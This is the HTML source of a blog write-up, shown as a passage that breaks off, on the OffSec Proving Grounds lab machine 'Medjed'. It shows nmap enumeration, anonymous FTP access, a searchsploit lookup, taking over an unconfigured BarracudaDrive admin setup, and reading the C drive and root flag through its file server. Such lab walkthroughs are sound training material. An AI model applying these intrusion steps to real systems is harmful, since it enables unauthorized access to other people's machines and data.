@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Proving Grounds — Medjed&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Proving Grounds — Medjed">
+  
+    <meta name="description" content="Recently I’ve been doing more Proving Grounds in preparation for my OSCP exam later this year. These boxes certainly have a different “flavour” than HTB ones, often containing many different applications and services running simultaneously. OffSec also loves chaining multiple applications together in an exploit chain. Finding a vulnerability in an app often does not lead to a foothold directly, but instead is used to attack or enumerate other services. Medjed is a good example of this, with the foothold exploit leveraging several seemingly unrelated web apps. While not too difficult, it’s very easy to get stuck without thorough enumeration.">
+    <meta property="og:description" content="Recently I’ve been doing more Proving Grounds in preparation for my OSCP exam later this year. These boxes certainly have a different “flavour” than HTB ones, often containing many different applications and services running simultaneously. OffSec also loves chaining multiple applications together in an exploit chain. Finding a vulnerability in an app often does not lead to a foothold directly, but instead is used to attack or enumerate other services. Medjed is a good example of this, with the foothold exploit leveraging several seemingly unrelated web apps. While not too difficult, it’s very easy to get stuck without thorough enumeration.">
+  
+  
+    <meta property="og:image" content="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/offsec.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/offsec.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">Proving Grounds — Medjed</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Aug 28, 2025</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--brown">
+            <a href="tag/Proving Grounds">Proving Grounds</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/25c0b98a88f780b9a9fef6b4f5e3013a" class="PageRoot"><h3 id="https://www.notion.so/25c0b98a88f78164b0b5c03225ba3d66" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/25c0b98a88f78164b0b5c03225ba3d66"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/25c0b98a88f780a98810c68788850f2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recently I’ve been doing more Proving Grounds in preparation for my OSCP exam later this year. These boxes certainly have a different “flavour” than HTB ones, often containing many different applications and services running simultaneously. OffSec also loves chaining multiple applications together in an exploit chain. Finding a vulnerability in an app often does not lead to a foothold directly, but instead is used to attack or enumerate other services. Medjed is a good example of this, with the foothold exploit leveraging several seemingly unrelated web apps. While not too difficult, it’s very easy to get stuck without thorough enumeration.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f7818bbf2aca5760de2cec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f781aaa780e566ee287153" class="Divider"></div><h3 id="https://www.notion.so/25c0b98a88f781db938ddad67e0f5f24" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/25c0b98a88f781db938ddad67e0f5f24"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/25c0b98a88f78007a7bbc50fec35d577" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780ecb96cec6ccf158973" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 192.168.200.127        
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 20:27 ACST
+Nmap scan report for 192.168.200.127
+Host is up (0.21s latency).
+Not shown: 65517 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3306/tcp  open  mysql
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub
+8000/tcp  open  http-alt
+30021/tcp open  unknown
+33033/tcp open  unknown
+44330/tcp open  unknown
+45332/tcp open  unknown
+45443/tcp open  unknown
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 135,139,445,3306,5040,7680,8000,30021,33033,44330,45332,45443,49664-49669 192.168.200.127
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 20:30 ACST
+Nmap scan report for 192.168.200.127
+Host is up (0.21s latency).
+
+PORT      STATE  SERVICE       VERSION
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open   microsoft-ds?
+3306/tcp  open   mysql         MariaDB 10.3.24 or later (unauthorized)
+5040/tcp  open   unknown
+7680/tcp  closed pando-pub
+8000/tcp  open   http-alt      BarracudaServer.com (Windows)
+|_http-title: Home
+| http-webdav-scan: 
+|   Server Type: BarracudaServer.com (Windows)
+|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
+|   WebDAV type: Unknown
+|_  Server Date: Tue, 26 Aug 2025 11:03:07 GMT
+|_http-server-header: BarracudaServer.com (Windows)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| fingerprint-strings: 
+|   FourOhFourRequest, Socks5: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 26 Aug 2025 11:00:20 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|   GenericLines, GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 26 Aug 2025 11:00:14 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 26 Aug 2025 11:00:26 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|   SIPOptions: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Tue, 26 Aug 2025 11:01:32 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|     Content-Type: text/html
+|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
+|_    &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;Can&#x27;t parse request&lt;p&gt;BarracudaServer.com (Windows)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+| http-methods: 
+|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
+30021/tcp open   ftp           FileZilla ftpd 0.9.41 beta
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
+| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
+| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
+| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
+| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
+| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
+|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
+|_ftp-bounce: bounce working!
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+33033/tcp open   unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 3102
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot; /&gt;
+|     &lt;title&gt;Action Controller: Exception caught&lt;/title&gt;
+|     &lt;style&gt;
+|     body {
+|     background-color: #FAFAFA;
+|     color: #333;
+|     margin: 0px;
+|     body, p, ol, ul, td {
+|     font-family: helvetica, verdana, arial, sans-serif;
+|     font-size: 13px;
+|     line-height: 18px;
+|     font-size: 11px;
+|     white-space: pre-wrap;
+|     pre.box {
+|     border: 1px solid #EEE;
+|     padding: 10px;
+|     margin: 0px;
+|     width: 958px;
+|     header {
+|     color: #F0F0F0;
+|     background: #C52F24;
+|     padding: 0.5em 1.5em;
+|     margin: 0.2em 0;
+|     line-height: 1.1em;
+|     font-size: 2em;
+|     color: #C52F24;
+|     line-height: 25px;
+|     .details {
+|_    bord
+44330/tcp open   ssl/unknown
+|_ssl-date: 2025-08-26T11:03:39+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
+| Not valid before: 2009-08-27T14:40:47
+|_Not valid after:  2019-08-25T14:40:47
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 26 Aug 2025 11:00:30 GMT
+|     Server: BarracudaServer.com (Windows)
+|_    Connection: Close
+45332/tcp open   http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Quiz App
+45443/tcp open   http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Quiz App
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49668/tcp open   msrpc         Microsoft Windows RPC
+49669/tcp open   msrpc         Microsoft Windows RPC
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;..SNIP..&gt;
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=8/26%OT=135%CT=7680%CU=35923%PV=Y%DS=4%DC=T%G=Y%TM=68A
+OS:D948E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=105%TI=I%CI=I%TS=U)SEQ(
+OS:SP=103%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%T
+OS:S=U)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=10F%TI=I
+OS:%CI=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M
+OS:578NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70
+OS:)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
+OS:=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
+OS:K=G%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-08-26T11:03:09
+|_  start_date: N/A
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   217.05 ms 192.168.45.1
+2   217.02 ms 192.168.45.254
+3   217.06 ms 192.168.251.1
+4   216.27 ms 192.168.200.127
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.94 seconds</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f78046b8eed0f6dd65784e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s a lot going on here, with SMB, FTP, MySQL and 5 web servers running. The scan also identified FTP has anonymous access enabled.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f780eea38eeecd71776a3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f7805994fced1224b15016" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP30021 — FTP:</strong></span></span></p></div><pre id="https://www.notion.so/25c0b98a88f7808ebdc5dacd038fe8e6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> ftp 192.168.200.127 -P 30021
+
+Connected to 192.168.200.127.
+220-FileZilla Server version 0.9.41 beta
+220-written by Tim Kosse (Tim.Kosse@gmx.de)
+220 Please visit http://sourceforge.net/projects/filezilla/
+Name (192.168.200.127:ch3ng): anonymous
+331 Password required for anonymous
+Password: 
+230 Logged on
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||50026|)
+150 Connection accepted
+-r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
+-r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
+-r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
+-r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
+-r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
+-r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
+drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
+226 Transfer OK</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7805a91e9eefd4d49f08e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The folder structure looks like a Ruby on Rails application. I’ve pillaged through all the folders, but all I found were skeleton files with no useful information. This looked like a dead end, but it hinted that a Rails app might be running somewhere.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f780c1a53be8b8969b31ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f780d9bcfecc2f30772670" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP8000 and TCP44330 — BarracudaDrive:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f780aead35da1f7639a568" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_landing.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_landing.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780878034cacb4b71a3f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Port 8000 is running BarracudaDrive (now renamed as FuguHub), a Lua-based application that offers features like file sharing, lightweight application hosting, and CMS. This is something OffSec loves putting in their boxes: clunky and legacy management software with horrible user experience, but often running with elevated privileges and packed with abusable built-in features.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f78092bc9ef1732bd2516a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After a few seconds, it redirected to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/Config-Wizard/wizard/SetAdmin.lsp</code></span><span class="SemanticString"> prompting me to setup  an admin user.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780c2b647d22a99d5a5ac" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_newadmin.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_newadmin.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780c0a1a6c8106b752b7a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This indicated it’s a fresh install with no users configured yet. I’ll create a new admin </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ch3ng</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780048c06dfdd0871df74" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The about page also showed its exact version.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78082b5ffcceb4f54cbc3" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_about.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_about.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7803aacd4cea36ba7f441" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This version is ancient. According to its </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://fuguhub.com/readme.txt">changelog</a></span><span class="SemanticString">, 6.5 was released in May 2013! Searchsploit found a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.exploit-db.com/exploits/48789">public exploit</a></span><span class="SemanticString"> for this exact version.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780b8a54dffafae51d258" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> searchsploit barracudadrive
+
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+barracudadrive 3.7.2 - Multiple Vulnerabilities                                    | windows/remote/4713.txt
+BarracudaDrive v6.5 - Insecure Folder Permissions                                  | windows/local/48789.txt
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f78089b8abfcf9eb715a97" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it’s a privilege escalation exploit, it’s not relevant until a foothold is gained. I’ll note it down for later and continue exploring other pages in the app.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780d0ad68d16a8dc8d405" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_menu_list.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_menu_list.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f78059b9c5fca7151c92ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f780eabd75e7a7d909d7b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Web-File-Server:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f780a3b3ebea60eead5c30" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_webfileserver.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_webfileserver.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f7800f8a0ae376cb053a80" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">First there’s a web file sharing service. Clicking on the link shows 2 drives.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78014a131fd1244eee3d1" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_fs_root.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_fs_root.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f780f59247ed6782f9e29a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the icons, it supports many actions such as download, copy, and upload. Clicking on the folder does nothing, but changing the URL path to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/fs/C/</code></span><span class="SemanticString"> shows the contents in the C drive.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78003a115fe1b9c23dde9" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_fs_c.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_fs_c.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78000880adf3dfdd688fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Surprisingly it has full access to all the files, and the root flag can be read directly here.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780f2a323c6910d53163c" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_fs_flag.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_fs_flag.png" style="width:100%"/></a><figcaption><span 